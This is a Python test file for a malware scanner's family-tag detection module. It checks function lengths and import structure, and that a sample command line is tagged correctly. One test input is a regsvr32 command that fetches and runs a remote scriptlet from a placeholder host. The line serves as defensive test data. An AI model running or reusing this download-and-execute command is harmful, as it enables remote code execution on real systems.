from Virus_Scan.tests.support.canonical_chain_fixtures import physical_tag_evidence
import ast
from pathlib import Path

from Virus_Scan.detection.api.chain_evaluation import evaluate_chain_evidence
from Virus_Scan.detection.profiles.family_scan import explicit_missed_family_tag_scan


MODULE = Path("Virus_Scan/detection/profiles/family_scan.py")


def _function_lengths():
    tree = ast.parse(MODULE.read_text(encoding="utf-8"))
    return {
        node.name: node.end_lineno - node.lineno + 1
        for node in tree.body
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))
    }


def test_family_scan_entrypoint_is_bounded_and_preserves_key_detection_paths():
    lengths = _function_lengths()
    assert lengths["explicit_missed_family_tag_scan"] <= 40
    assert all(length <= 75 for length in lengths.values())
    tags = explicit_missed_family_tag_scan(
        "regsvr32 /s /n /u /i:https://example.invalid/a.sct scrobj.dll powershell",
        path="case.txt",
    )
    assert "regsvr32_exec" in tags
    assert "network_download" in tags
    assert "process_exec" in tags
    assert "download_execute_chain" not in tags
    evidence = evaluate_chain_evidence(tags=physical_tag_evidence(tuple(tags)))
    decision = next(
        item for item in evidence.decisions
        if item.candidate.chain_id == "anchor:download_execute_chain"
    )
    assert decision.status == "candidate"
    assert decision.candidate.order_class == "unordered_correlation"


def test_family_scan_delegates_owned_sections_without_function_local_imports():
    text = MODULE.read_text(encoding="utf-8")
    required_helpers = {
        "_add_game_engine_threat_tags",
        "_add_lolbin_macro_and_c2_tags",
        "_add_wallet_privilege_archive_and_dll_tags",
        "_add_reflection_anti_exfil_clipboard_and_packer_tags",
        "_add_media_stego_tags",
        "_add_pickle_and_renpy_tags",
        "_add_packed_exe_tags",
    }
    for helper in required_helpers:
        assert f"def {helper}" in text
    tree = ast.parse(text)
    function_local_imports = []
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            for child in ast.walk(node):
                if isinstance(child, (ast.Import, ast.ImportFrom)):
                    function_local_imports.append((node.name, child.lineno))
    assert function_local_imports == []
    assert "importlib" not in text
